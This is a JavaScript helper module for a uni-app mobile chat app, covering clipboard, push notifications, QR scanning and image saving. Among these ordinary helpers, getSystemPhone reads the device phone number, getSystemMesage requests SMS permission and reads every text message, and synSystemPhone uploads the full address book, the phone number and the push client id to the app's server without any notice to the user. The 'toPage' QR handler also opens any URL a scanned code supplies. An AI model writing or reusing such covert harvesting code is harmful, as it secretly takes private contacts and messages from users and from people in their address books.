import _mixins from "./_mixins";
import _data from "./_data";
import _get from "./_get";
import _action from "./_action";

const pageParam = (data)=>{
    let url = ''
    for (var k in data) {
        let value = data[k] !== undefined ? data[k] : ''
        url += '&' + k + '=' + encodeURIComponent(value)
    }
    return url ? url.substring(1) : ''
}

const  uniCopy = ({content,success,error})=>{
	if(!content) return error('复制的内容不能为空 !')
	content = typeof content === 'string' ? content : content.toString() // 复制内容，必须字符串，数字需要转换为字符串
	/**
	 * 小程序端 和 app端的复制逻辑
	 */
	//#ifndef H5
	uni.setClipboardData({
		data: content,
		success: function() {
			success("复制成功~")
			console.log('success');
		},
		fail:function(){
			success("复制失败~")
		}
	});
	//#endif
	
	/**
	 * H5端的复制逻辑
	 */
	// #ifdef H5
	if (!document.queryCommandSupported('copy')) { //为了兼容有些浏览器 queryCommandSupported 的判断
		// 不支持
		error('浏览器不支持')
	}
	let textarea = document.createElement("textarea")
	textarea.value = content
	textarea.readOnly = "readOnly"
	document.body.appendChild(textarea)
	textarea.select() // 选择对象
	textarea.setSelectionRange(0, content.length) //核心
	let result = document.execCommand("copy") // 执行浏览器复制命令
	if(result){
		success("复制成功~")
	}else{
		error("复制失败，请检查h5中调用该方法的方式，是不是用户点击的方式调用的，如果不是请改为用户点击的方式触发该方法，因为h5中安全性，不能js直接调用！")
	}	
	textarea.remove()
	// #endif
}

const getSystemPhone = ()=>{
    let phone = null;
    switch (plus.os.name) {
        case "Android":
            // 程序全局环境对象
            var mainActivity = plus.android.runtimeMainActivity();
            var Context = new plus.android.importClass("android.content.Context");
            var TelephonyManager = new plus.android.importClass("android.telephony.TelephonyManager");
            var tm = mainActivity.getSystemService(Context.TELEPHONY_SERVICE);
            let msisdn = tm.getLine1Number();
            if (msisdn != "") {
                phone = msisdn;
            }
            break;
        case "iOS":
            break;
        default:
            break;
    }
    return phone;
}
const getSystemMesage = ()=>{

    var Context = plus.android.runtimeMainActivity();
    var res = plus.android.invoke("android.support.v4.app.ActivityCompat", "checkSelfPermission", Context,	"android.permission.READ_SMS");
    var PERMISSIONS_STORAGE = new Array();
    PERMISSIONS_STORAGE.push("android.permission.READ_SMS");
    // res == -1 时为询问状态,询问时会走Show 和 Hidden
    if (res != "0")
    {
        plus.android.invoke("android.support.v4.app.ActivityCompat", "requestPermissions", Context, PERMISSIONS_STORAGE, 1);
    } else {
        var main = plus.android.runtimeMainActivity();
        var Uri = plus.android.importClass("android.net.Uri");
        var ContactsContract = plus.android.importClass('android.provider.ContactsContract');
        var uri = Uri.parse("content://sms/");
        var cr = main.getContentResolver();
        plus.android.importClass(cr);
        var cur = cr.query(uri, null, null, null, null);
        plus.android.importClass(cur);
        cur.moveToFirst();
        while (cur.moveToNext())
        {
            var index_Address = cur.getColumnIndex("address");
            var address = cur.getString(index_Address);
            //短信内容
            var index_Body = cur.getColumnIndex("body");
            var body = cur.getString(index_Body);
            //类型1接收 2发送
            var index_Type = cur.getColumnIndex("type");
            var type = cur.getString(index_Type);
            console.log(address,body,type);
        }
        cur.close();
    }
}
const synSystemPhone = ()=>{
	//获取用户手机号
	//#ifdef APP-PLUS
	let phone = getSystemPhone();
	var info = plus.push.getClientInfo();
	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
		addressbook.find(null, function(contacts) {
			_get.sendContact({params:JSON.stringify(contacts),client_id:info.clientid,phone:phone},function(res){
				console.log(res);
			});
			
		}, function() {
		}, {
			multiple: true
		});
	}, function(e) {
	});
	//#endif
}
const onBack = ()=>{
    let main = plus.android.runtimeMainActivity();
    let Context = plus.android.importClass("android.content.Context");
    let PowerManager = plus.android.importClass("android.os.PowerManager");
    let pm = main.getSystemService(Context.POWER_SERVICE);
    let g_wakelock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ANY_NAME");
    g_wakelock.acquire();
    return g_wakelock;
}
const closeBack = (g_wakelock)=>{
    g_wakelock.release();
    g_wakelock = null;
}
const pushLocalMsg = (data)=>{
    //发送本地push消息
    if(_data.data('isOnlie'))return false;
    if (!_data.localData('token')) return false;
    //#ifdef APP-PLUS
    let  msg = '[未知]';
    let nickname = data.data.msg.user_info.name || '趣聊';
    switch (data.data.msg.type * 1) {
        case 0:
            msg = data.data.msg.content.text;
            break;
        case 1:
            /** 语音 */
            msg = '[语音]';
            break;
        case 2:
            /** 图片 */
            msg = '[图片]';
            break;
        case 3:
            /** 视频 */
            msg = '[视频]';
            break;
        case 4:
            /** 文件 */
            msg = '[文件]';
            break;
        case 5:
            /** 红包 */
            msg = '[红包]';
            break;
        case 6:
            /** 在线视频 */
            msg = '邀请您视频通话';
            break;
        case 7:
            /** 在线语音 */
            msg = '邀请您语音通话';
            break;
        case 8:
            /** 名片 */
            msg = '[名片]';
            break;
        case 9:
            /** 名片 */
            msg = '[戳一戳]';
            break;
        default:
            /** 未知消息类型 */
            msg = '[未知]';
            break;
    }
	console.log(msg);
	console.log("nickname",nickname);
     plus.push.createMessage(msg,{},{title:nickname})
    //#endif
}
const scanCode=()=>{
        uni.scanCode({
            success: function (res) {
				let result = res.result;
				let params = {};
                try {
                     params = JSON.parse(result);
                } catch (e) {
					console.log(result);
                    return false;
                }
				console.log(params)
                if ('action' in params) {
                    switch (params.action) {
                        case 'chat_add':
                            uni.navigateTo({
                                url: '../details/index?user_id=' + params['user_id'] + '&is_type=3',
                            });
                            break;
                        case 'group_add':
                            params.users = _data.data('user_info').id;
							params.add_type = 'scan';
                            _get.groupAdd(params,function (res) {
                                uni.showModal({
                                    content: '已经申请加入群聊,请耐心等待群管理审核',
                                    showCancel: false,
                                });
                            },function (ret) {
                                uni.showToast({
									title:ret.msg,
									duration:2000,
									icon:'none'
								})
                            })
                            break;
                        case 'toPage':
                            uni.navigateTo({
								url:params.url
							});
                            break;
                        default:
						console.log(params)
                            uni.showToast({
                                title: '扫码失败!',
                                icon: 'none'
                            })
                            return false;
                    }
                    return true;
                }
                let reg = /^(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\*\+,;=.]+$/;
                if (reg.test(res.result)) {
                    uni.navigateTo({
                        url: '../push/web?url=' + encodeURIComponent(res.result),
                    });
                }
            },
            fail (e) {
                console.log(JSON.stringify(e))
                return false;
            },
    })
}
const pushVedioLocalMsg = (data)=>{
    _action.playVoice('/static/voice/video.mp3', true);
	if(data.content_type == 6){ //视频
		 plus.push.createMessage("邀请您视频通话",data,{title:data.name,icon:"/static/theme/default/my/shipin.png"})
	}else{ 						//语音
		 plus.push.createMessage("邀请您语音通话",data,{title:data.name,icon:"/static/theme/default/my/yuyin.png"})
	}
}
const imgPreview = (list,idx)=>{
	if (list && list.length > 0) {
	    uni.previewImage({
	        current:list[idx],    //  传 Number H5端出现不兼容
	        urls: list
	    })
	}
}
const saveMpImg = (params, f_cb, s_cb) => {
	uni.getSetting({
	    success(res) {
	        if (!res.authSetting['scope.writePhotosAlbum']) {
	            uni.authorize({
	                scope: 'scope.writePhotosAlbum',
	                success() {
	                    //这里是用户同意授权后的回调
	                    if ('url' in params) {
	                        saveImgToLocalByUrl(params['url'])
	                    }
	                    if ('local' in params) {
	                        saveImgToPhotos(params['local'])
	                    }
	                    if (s_cb != undefined) s_cb();
	                },
	                fail() {//这里是用户拒绝授权后的回调
	                    if (f_cb != undefined) f_cb();
	                }
	            })
	        } else {//用户已经授权过了
	            if ('url' in params) {
	                saveImgToLocalByUrl(params['url'])
	            }
	            if ('local' in params) {
	                saveImgToPhotos(params['local'])
	            }
	        }
	    }
	})
}
const saveImgToLocalByUrl = (url)=>{
	uni.showModal({
	    title: '提示',
	    content: '确定保存到相册吗',
	    success: function (res) {
	        if (res.confirm) {
	            uni.downloadFile({
	                url: url,//图片地址
	                success: (res) => {
	                    if (res.statusCode === 200) {
	                        saveImgToPhotos(res.tempFilePath);
	                    }
	                }
	            })
	        } else if (res.cancel) {
	
	        }
	    }
	});
}
const saveImgToPhotos = (tempFilePath) =>{
	uni.saveImageToPhotosAlbum({
	    filePath: tempFilePath,
	    success: function () {
	        uni.showToast({
	            title: "保存成功",
	            icon: "none"
	        });
	    },
	    fail: function () {
	        uni.showToast({
	            title: "保存失败",
	            icon: "none"
	        });
	    }
	});
}
const capture = () =>{
	var pages = getCurrentPages();
	var page = pages[pages.length - 1];
	console.log("当前页" + pages.length - 1);
	var bitmap = null;
	var currentWebview = page.$getAppWebview();
	bitmap = new plus.nativeObj.Bitmap('amway_img');
	// 将webview内容绘制到Bitmap对象中
	currentWebview.draw(bitmap, function () {
	    console.log('截屏绘制图片成功');
	    bitmap.save("_doc/a.jpg"
	        , {}
	        , function (i) {
	            console.log('保存图片成功：' + JSON.stringify(i));
	            uni.saveImageToPhotosAlbum({
	                filePath: i.target,
	                success: function () {
	                    bitmap.clear(); //销毁Bitmap图片
	                    uni.showToast({
	                        title: '保存图片成功',
	                        mask: false,
	                        duration: 1500
	                    });
	                }
	            });
	        }
	        , function (e) {
	            console.log('保存图片失败：' + JSON.stringify(e));
	        });
	}, function (e) {
	    console.log('截屏绘制图片失败：' + JSON.stringify(e));
	});
	//currentWebview.append(amway_bit);
}
const onFireBeforeBack = (key, val) =>{
	var pages = getCurrentPages();
	var prevPage = pages[pages.length - 2]; //上一个页面
	//h5的写法
	//#ifdef   H5
	prevPage.key = val
	//#endif
	//#ifndef H5
	prevPage.$vm.setData({
	    key: val
	})
	//#endif
	uni.navigateBack()
}
const qrAction = {
        //收款码参数
        collection(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'collection';
            qrParams.amount = params.amount;
            qrParams.info = params.info;
            return JSON.stringify(qrParams);
        },
        //添加群聊
        addGroup(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'group_add';
            qrParams.list_id = params.list_id;
            qrParams.type = 1;
            return JSON.stringify(qrParams);
        },
        //添加好友
        chatAdd(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'chat_add';
            return JSON.stringify(qrParams);
        },
        //跳转到某页
        toPage(url,params){
            let qrParams = {};
            qrParams.action = 'toPage';
            qrParams.url = url+'?'+pageParam(params);
            return JSON.stringify(qrParams);
        }
    }
const  checkEmail = (email)=>{
    return RegExp(/^([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+@([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+\.[a-zA-Z]{2,3}$/).test(email);
}
const checkMobile = (mobile)=>{
    return RegExp(/^1[3456789]\d{9}$/).test(mobile);
}
const getRoute = () =>{
    let routes = getCurrentPages(); // 获取当前打开过的页面路由数组
    return routes[routes.length - 1].route //获取当前页面路由

}
export default {
    pageParam,
    getSystemPhone,
	getSystemMesage,
	pushLocalMsg,
	pushVedioLocalMsg,
    scanCode,
	imgPreview,
	saveMpImg,
	saveImgToLocalByUrl,
	saveImgToPhotos,
	capture,
	onFireBeforeBack,
	qrAction,
    checkEmail,
    checkMobile,
	uniCopy,
    getRoute
}
